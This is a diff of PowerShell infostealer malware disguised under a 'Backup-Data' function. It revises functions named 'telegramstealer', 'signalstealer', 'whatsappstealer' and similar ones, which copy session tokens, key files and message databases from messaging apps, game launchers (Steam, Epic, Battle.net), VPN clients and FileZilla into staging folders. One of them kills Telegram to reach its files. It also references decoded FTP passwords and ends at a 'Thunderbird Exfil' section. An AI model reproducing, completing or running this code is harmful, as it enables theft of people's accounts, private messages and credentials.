@@ -288,117 +288,126 @@ function Backup-Data {
 
 
     # All Messaging Sessions
+	
+	# Telegram Session
     function telegramstealer {
-        $processname = "telegram"
-        $pathtele = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
-        if (!(Test-Path $pathtele)) { return }
-        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
-        $destination = "$folder_messaging\Telegram.zip"
-        $exclude = @("_*.config", "temp", "dumps", "tdummy", "emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5", "user_data#6", "*.json", "webview")
-        $files = Get-ChildItem -Path $pathtele -Exclude $exclude
-        Compress-Archive -Path $files -DestinationPath $destination -CompressionLevel Fastest -Force
+	$processname = "telegram"
+	$telegramProcess = Get-Process -Name $processname -ErrorAction SilentlyContinue
+    if ($telegramProcess) {$telegramPID = $telegramProcess.Id; $telegramPath = (gwmi Win32_Process -Filter "ProcessId = $telegramPID").CommandLine.split('"')[1]
+    Stop-Process -Id $telegramPID -Force
     }
+    $telegramsession = Join-Path $folder_messaging "Telegram"
+	New-Item -ItemType Directory -Force -Path $telegramsession | Out-Null
+    $pathtele = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
+    $items = Get-ChildItem -Path $pathtele
+    foreach ($item in $items) {
+    if ($item.GetType() -eq [System.IO.FileInfo]) {
+    if (($item.Name.EndsWith("s") -and $item.Length -lt 200KB) -or
+    ($item.Name.StartsWith("key_data") -or $item.Name.StartsWith("settings") -or $item.Name.StartsWith("configs") -or $item.Name.StartsWith("maps"))) {
+    Copy-Item -Path $item.FullName -Destination $telegramsession -Force }}
+    elseif ($item.GetType() -eq [System.IO.DirectoryInfo]) {
+    if ($item.Name.Length -eq 16) {
+    $files = Get-ChildItem -Path $item.FullName -File             
+    foreach ($file in $files) {
+    if ($file.Name.EndsWith("s") -and $file.Length -lt 200KB) {
+    $destinationDirectory = Join-Path -Path $telegramsession -ChildPath $item.Name
+    if (-not (Test-Path -Path $destinationDirectory -PathType Container)) {
+    New-Item -ItemType Directory -Path $destinationDirectory | Out-Null }
+    Copy-Item -Path $file.FullName -Destination $destinationDirectory -Force }}}}}
+    try { (Start-Process -FilePath $telegramPath) } catch {}   
+    }
+    telegramstealer
 
 
-    # Element Session Stealer
+    # Element Session 
     function elementstealer {
-        $processname = "element"
         $elementfolder = "$env:userprofile\AppData\Roaming\Element"
         if (!(Test-Path $elementfolder)) { return }
-        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
         $element_session = "$folder_messaging\Element"
         New-Item -ItemType Directory -Force -Path $element_session | Out-Null
-        Copy-Item -Path "$elementfolder\databases" -Destination $element_session -Recurse -force 
-        Copy-Item -Path "$elementfolder\Local Storage" -Destination $element_session -Recurse -force 
-        Copy-Item -Path "$elementfolder\Session Storage" -Destination $element_session -Recurse -force 
         Copy-Item -Path "$elementfolder\IndexedDB" -Destination $element_session -Recurse -force 
-        Copy-Item -Path "$elementfolder\sso-sessions.json" -Destination $element_session -Recurse -force 
-    }
+        Copy-Item -Path "$elementfolder\Local Storage" -Destination $element_session -Recurse -force 
+        }
+    elementstealer
 
 
-    # ICQ Session Stealer
+    # ICQ Session 
     function icqstealer {
-        $processname = "icq"
         $icqfolder = "$env:userprofile\AppData\Roaming\ICQ"
         if (!(Test-Path $icqfolder)) { return }
-        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue') { Get-Process -Name $processname  | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
         $icq_session = "$folder_messaging\ICQ"
         New-Item -ItemType Directory -Force -Path $icq_session | Out-Null
         Copy-Item -Path "$icqfolder\0001" -Destination $icq_session -Recurse -force 
     }
+	icqstealer
 
 
-    # Signal Session Stealer
+    # Signal Session 
     function signalstealer {
-        $processname = "signal"
         $signalfolder = "$env:userprofile\AppData\Roaming\Signal"
         if (!(Test-Path $signalfolder)) { return }
-        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
         $signal_session = "$folder_messaging\Signal"
         New-Item -ItemType Directory -Force -Path $signal_session | Out-Null
-        Copy-Item -Path "$signalfolder\databases" -Destination $signal_session -Recurse -force
-        Copy-Item -Path "$signalfolder\Local Storage" -Destination $signal_session -Recurse -force
-        Copy-Item -Path "$signalfolder\Session Storage" -Destination $signal_session -Recurse -force
         Copy-Item -Path "$signalfolder\sql" -Destination $signal_session -Recurse -force
+		Copy-Item -Path "$signalfolder\attachments.noindex" -Destination $signal_session -Recurse -force
         Copy-Item -Path "$signalfolder\config.json" -Destination $signal_session -Recurse -force
-    }
+    } 
+    signalstealer
 
 
-    # Viber Session Stealer
+    # Viber Session 
     function viberstealer {
-        $processname = "viber"
-        $viberfolder = "$env:userprofile\AppData\Roaming\ViberPC"
-        if (!(Test-Path $viberfolder)) { return }
-        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
-        $viber_session = "$folder_messaging\Viber"
-        New-Item -ItemType Directory -Force -Path $viber_session | Out-Null
-        $configfiles = @("config$1")
-        foreach ($file in $configfiles) {
-            Get-ChildItem -path $viberfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach-Object { Copy-Item -path $PSItem.FullName -Destination $viber_session }
-        }
-        $pattern = "^([\+|0-9 ][ 0-9.]{1,12})$"
-        $directories = Get-ChildItem -Path $viberFolder -Directory | Where-Object { $_.Name -match $pattern }
-        foreach ($directory in $directories) {
-            $destinationPath = Join-Path -Path $viber_session -ChildPath $directory.Name
-            Copy-Item -Path $directory.FullName -Destination $destinationPath -Force
-        }
-        $files = Get-ChildItem -Path $viberFolder -File -Recurse -Include "*.db", "*.db-shm", "*.db-wal" | Where-Object { -not $_.PSIsContainer }
-        foreach ($file in $files) {
-            $parentFolder = Split-Path -Path $file.FullName -Parent
-            $phoneNumberFolder = Get-ChildItem -Path $parentFolder -Directory | Where-Object { $_.Name -match $pattern }
-            if (-not $phoneNumberFolder) {
-                Copy-Item -Path $file.FullName -Destination $destinationPath
-            }
-        }
+    $viberfolder = "$env:userprofile\AppData\Roaming\ViberPC"
+    if (!(Test-Path $viberfolder)) { return }
+    $viber_session = "$folder_messaging\Viber"
+    New-Item -ItemType Directory -Force -Path $viber_session | Out-Null
+    $pattern = "^([\+|0-9][0-9.]{1,12})$"
+    $directories = Get-ChildItem -Path $viberfolder -Directory | Where-Object { $_.Name -match $pattern }
+    $rootFiles = Get-ChildItem -Path $viberfolder -File | Where-Object { $_.Name -match "(?i)\.db$|\.db-wal$" }
+    foreach ($rootFile in $rootFiles) {Copy-Item -Path $rootFile.FullName -Destination $viber_session -Force }    
+    foreach ($directory in $directories) {
+    $destinationPath = Join-Path -Path $viber_session -ChildPath $directory.Name
+    Copy-Item -Path $directory.FullName -Destination $destinationPath -Force        
+    $files = Get-ChildItem -Path $directory.FullName -File -Recurse -Include "*.db", "*.db-wal" | Where-Object { -not $_.PSIsContainer }
+    foreach ($file in $files) {
+    $destinationPathFiles = Join-Path -Path $destinationPath -ChildPath $file.Name
+    Copy-Item -Path $file.FullName -Destination $destinationPathFiles -Force
     }
+    }
+    }
+    viberstealer
 
 
-    # Whatsapp Session Stealer
+    # Whatsapp Session 
     function whatsappstealer {
-        $processname = "whatsapp"
-        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
-        $whatsapp_session = "$folder_messaging\Whatsapp"
-        New-Item -ItemType Directory -Force -Path $whatsapp_session | Out-Null
-        $regexPattern = "WhatsAppDesktop"
-        $parentFolder = Get-ChildItem -Path "$env:localappdata\Packages" -Directory | Where-Object { $_.Name -match $regexPattern }
-        if ($parentFolder) {
-            $localStateFolder = Get-ChildItem -Path $parentFolder.FullName -Filter "LocalState" -Recurse -Directory
-            if ($localStateFolder) {
-                $destinationPath = Join-Path -Path $whatsapp_session -ChildPath $localStateFolder.Name
-                Copy-Item -Path $localStateFolder.FullName -Destination $destinationPath -Recurse
-            }
-        }
+    $whatsapp_session = "$folder_messaging\Whatsapp"
+    New-Item -ItemType Directory -Force -Path $whatsapp_session | Out-Null
+    $regexPattern = "^[a-z0-9]+\.WhatsAppDesktop_[a-z0-9]+$"
+    $parentFolder = Get-ChildItem -Path "$env:localappdata\Packages" -Directory | Where-Object { $_.Name -match $regexPattern }
+    if ($parentFolder) {
+    $localStateFolders = Get-ChildItem -Path $parentFolder.FullName -Filter "LocalState" -Recurse -Directory
+    foreach ($localStateFolder in $localStateFolders) {
+    $profilePicturesFolder = Get-ChildItem -Path $localStateFolder.FullName -Filter "profilePictures" -Recurse -Directory
+    if ($profilePicturesFolder) {
+    $destinationPath = Join-Path -Path $whatsapp_session -ChildPath $localStateFolder.Name
+    $profilePicturesDestination = Join-Path -Path $destinationPath -ChildPath "profilePictures"
+    Copy-Item -Path $profilePicturesFolder.FullName -Destination $profilePicturesDestination -Recurse -ErrorAction SilentlyContinue}}
+    foreach ($localStateFolder in $localStateFolders) {
+    $filesToCopy = Get-ChildItem -Path $localStateFolder.FullName -File | Where-Object { $_.Length -le 10MB -and $_.Name -match "(?i)\.db$|\.db-wal|\.dat$" }
+    $destinationPath = Join-Path -Path $whatsapp_session -ChildPath $localStateFolder.Name
+    Copy-Item -Path $filesToCopy.FullName -Destination $destinationPath -Recurse }}
     }
+    whatsappstealer
 
+    # Skype Session
     function skype_stealer {
-        $processname = "skype"
         $skypefolder = "$env:appdata\microsoft\skype for desktop"
         if (!(Test-Path $skypefolder)) { return }
-        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
         $skype_session = "$folder_messaging\Skype"
         New-Item -ItemType Directory -Force -Path $skype_session | Out-Null
         Copy-Item -Path "$skypefolder\Local Storage" -Destination $skype_session -Recurse -force
     }
+	skype_stealer
 	
     function pidgin_stealer {
         $pidgin_folder = "$env:userprofile\AppData\Roaming\.purple"
@@ -407,14 +416,14 @@ function Backup-Data {
         New-Item -ItemType Directory -Force -Path $pidgin_accounts | Out-Null
         Copy-Item -Path "$pidgin_folder\accounts.xml" -Destination $pidgin_accounts -Recurse -force 
     }
+	pidgin_stealer
 
     # All Gaming Sessions
+	
     # Steam Session Stealer
     function steamstealer {
-        $processname = "steam"
         $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
         if (!(Test-Path $steamfolder)) { return }
-        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
         $steam_session = "$folder_gaming\Steam"
         New-Item -ItemType Directory -Force -Path $steam_session | Out-Null
         Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
@@ -423,6 +432,7 @@ function Backup-Data {
             Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach-Object { Copy-Item -path $PSItem.FullName -Destination $steam_session }
         }
     }
+	steamstealer
 
 
     # Minecraft Session Stealer
@@ -435,59 +445,57 @@ function Backup-Data {
         Get-ChildItem $minecraftfolder1 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session 
         Get-ChildItem $minecraftfolder2 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session 
     }
+	minecraftstealer
 
     # Epicgames Session Stealer
     function epicgames_stealer {
-        $processname = "epicgameslauncher"
         $epicgamesfolder = "$env:localappdata\EpicGamesLauncher"
         if (!(Test-Path $epicgamesfolder)) { return }
-        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' -ErrorAction 'SilentlyContinue') { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' -Force } } catch {}
         $epicgames_session = "$folder_gaming\EpicGames"
         New-Item -ItemType Directory -Force -Path $epicgames_session | Out-Null
         Copy-Item -Path "$epicgamesfolder\Saved\Config" -Destination $epicgames_session -Recurse -force
         Copy-Item -Path "$epicgamesfolder\Saved\Logs" -Destination $epicgames_session -Recurse -force
         Copy-Item -Path "$epicgamesfolder\Saved\Data" -Destination $epicgames_session -Recurse -force
     }
+	epicgames_stealer
 
     # Ubisoft Session Stealer
     function ubisoftstealer {
-        $processname = "upc"
         $ubisoftfolder = "$env:localappdata\Ubisoft Game Launcher"
         if (!(Test-Path $ubisoftfolder)) { return }
-        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue'-ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' -Force } } catch {}
         $ubisoft_session = "$folder_gaming\Ubisoft"
         New-Item -ItemType Directory -Force -Path $ubisoft_session | Out-Null
         Copy-Item -Path "$ubisoftfolder" -Destination $ubisoft_session -Recurse -force
     }
+	ubisoftstealer
 
     # EA Session Stealer
     function electronic_arts {
-        $processname = "eadesktop"
-        $eafolder = "$env:localappdata\Electronic Arts"
-        if (!(Test-Path $eafolder)) { return }
-        $ea_session = "$folder_gaming\Electronic Arts"
-        if (!(Test-Path $ea_session)) { return }
-        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
-        New-Item -ItemType Directory -Force -Path $ea_session | Out-Null
-        Copy-Item -Path "$eafolder" -Destination $ea_session -Recurse -force
+    $eafolder = "$env:localappdata\Electronic Arts\EA Desktop\CEF"
+    if (!(Test-Path $eafolder)) { return }
+    $ea_session = "$folder_gaming\Electronic Arts"
+    New-Item -ItemType Directory -Path $ea_session -Force | Out-Null
+    $parentDirName = (Get-Item $eafolder).Parent.Name
+    $destination = Join-Path $ea_session $parentDirName
+    New-Item -ItemType Directory -Path $destination -Force | Out-Null
+    Copy-Item -Path $eafolder -Destination $destination -Recurse -Force
     }
+    electronic_arts
 
     # Growtopia Stealer
     function growtopiastealer {
-        $processname = "growtopia"
-        $growtopiafolder = "$env:localappdata\Growtopia"
-        if (!(Test-Path $growtopiafolder)) { return }
-        $growtopia_session = "$folder_gaming\Growtopia"
-        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
-        New-Item -ItemType Directory -Force -Path $growtopia_session | Out-Null
-        Copy-Item -Path "$growtopiafolder\save.dat" -Destination $growtopia_session -Recurse -force
+    $growtopiafolder = "$env:localappdata\Growtopia"
+    if (!(Test-Path $growtopiafolder)) { return }
+    $growtopia_session = "$folder_gaming\Growtopia"
+    New-Item -ItemType Directory -Force -Path $growtopia_session | Out-Null
+    $save_file = "$growtopiafolder\save.dat"
+    if (Test-Path $save_file) {Copy-Item -Path $save_file -Destination $growtopia_session} 
     }
+    growtopiastealer
 
     function battle_net_stealer {
-        $processnames = @("Battle.net", "Agent")
         $battle_folder = "$env:appdata\Battle.net"
         if (!(Test-Path $battle_folder)) { return }
-        foreach ($process in $processnames) { Stop-Process -Name $process -ErrorAction 'SilentlyContinue' -Force }
         $battle_session = "$folder_gaming\Battle.net"
         New-Item -ItemType Directory -Force -Path $battle_session | Out-Null
         $files = Get-ChildItem -Path $battle_folder -File -Recurse -Include "*.db", "*.config" 
@@ -495,75 +503,48 @@ function Backup-Data {
             Copy-Item -Path $file.FullName -Destination $battle_session
         }
     }
+	battle_net_stealer
 
 
     # All VPN Sessions
 
-    # NordVPN 
-    function nordvpnstealer {
-        $processname = "nordvpn"
-        $nordvpnfolder = "$env:localappdata\nordvpn"
-        if (!(Test-Path $nordvpnfolder)) { return }
-        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
-        $nordvpn_account = "$folder_vpn\NordVPN"
-        New-Item -ItemType Directory -Force -Path $nordvpn_account | Out-Null
-        $pattern = "^([A-Za-z]+\.exe_Path_[A-Za-z0-9]+)$"
-        $directories = Get-ChildItem -Path $nordvpnfolder -Directory | Where-Object { $_.Name -match $pattern }
-        $files = Get-ChildItem -Path $nordvpnfolder -File | Where-Object { $_.Name -match $pattern }
-        foreach ($directory in $directories) {
-            $destinationPath = Join-Path -Path $nordvpn_account -ChildPath $directory.Name
-            Copy-Item -Path $directory.FullName -Destination $destinationPath -Recurse -Force
-        }
-        foreach ($file in $files) {
-            $destinationPath = Join-Path -Path $nordvpn_account -ChildPath $file.Name
-            Copy-Item -Path $file.FullName -Destination $destinationPath -Force
-        }
-        Copy-Item -Path "$nordvpnfolder\ProfileOptimization" -Destination $nordvpn_account -Recurse -force   
-        Copy-Item -Path "$nordvpnfolder\libmoose.db" -Destination $nordvpn_account -Recurse -force
-    }
-
 
     # ProtonVPN
-    function protonvpnstealer {
-        $processname = "protonvpn"
+    function protonvpnstealer {   
         $protonvpnfolder = "$env:localappdata\protonvpn"  
         if (!(Test-Path $protonvpnfolder)) { return }
-        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
         $protonvpn_account = "$folder_vpn\ProtonVPN"
         New-Item -ItemType Directory -Force -Path $protonvpn_account | Out-Null
         $pattern = "^(ProtonVPN_Url_[A-Za-z0-9]+)$"
         $directories = Get-ChildItem -Path $protonvpnfolder -Directory | Where-Object { $_.Name -match $pattern }
-        $files = Get-ChildItem -Path $protonvpnfolder -File | Where-Object { $_.Name -match $pattern }
         foreach ($directory in $directories) {
             $destinationPath = Join-Path -Path $protonvpn_account -ChildPath $directory.Name
             Copy-Item -Path $directory.FullName -Destination $destinationPath -Recurse -Force
         }
-        foreach ($file in $files) {
-            $destinationPath = Join-Path -Path $protonvpn_account -ChildPath $file.Name
-            Copy-Item -Path $file.FullName -Destination $destinationPath -Force
-        }
-        Copy-Item -Path "$protonvpnfolder\Startup.profile" -Destination $protonvpn_account -Recurse -force
     }
+    protonvpnstealer
 
 
     #Surfshark VPN
     function surfsharkvpnstealer {
-        $processname = "Surfshark"
         $surfsharkvpnfolder = "$env:appdata\Surfshark"
         if (!(Test-Path $surfsharkvpnfolder)) { return }
-        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
         $surfsharkvpn_account = "$folder_vpn\Surfshark"
         New-Item -ItemType Directory -Force -Path $surfsharkvpn_account | Out-Null
         Get-ChildItem $surfsharkvpnfolder -Include @("data.dat", "settings.dat", "settings-log.dat", "private_settings.dat") -Recurse | Copy-Item -Destination $surfsharkvpn_account
     }
+	surfsharkvpnstealer
 	
+	# OpenVPN 
     function openvpn_stealer {
         $openvpnfolder = "$env:userprofile\AppData\Roaming\OpenVPN Connect"
         if (!(Test-Path $openvpnfolder)) { return }
         $openvpn_accounts = "$folder_vpn\OpenVPN"
         New-Item -ItemType Directory -Force -Path $openvpn_accounts | Out-Null
         Copy-Item -Path "$openvpnfolder\profiles" -Destination $openvpn_accounts -Recurse -force 
+		Copy-Item -Path "$openvpnfolder\config.json" -Destination $openvpn_accounts -Recurse -force 
     }
+    openvpn_stealer
 
     # FTP Clients 
 
@@ -613,30 +594,7 @@ Pass: $decodedPass
         }
         $serversInfo | Out-File -FilePath "$filezilla_hosts\Hosts.txt" -Force
     }
-
-    function Export-Data_Sessions {        
-        telegramstealer
-        elementstealer
-        icqstealer
-        signalstealer
-        viberstealer
-        whatsappstealer
-        skype_stealer
-        steamstealer
-        minecraftstealer
-        epicgames_stealer
-        ubisoftstealer
-        electronic_arts
-        growtopiastealer
-        battle_net_stealer
-        nordvpnstealer
-        protonvpnstealer
-        surfsharkvpnstealer 
-        filezilla_stealer
-        pidgin_stealer
-        openvpn_stealer		
-    }
-    Export-Data_Sessions
+	filezilla_stealer
 
     # Thunderbird Exfil
     if (Test-Path -Path "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles") {
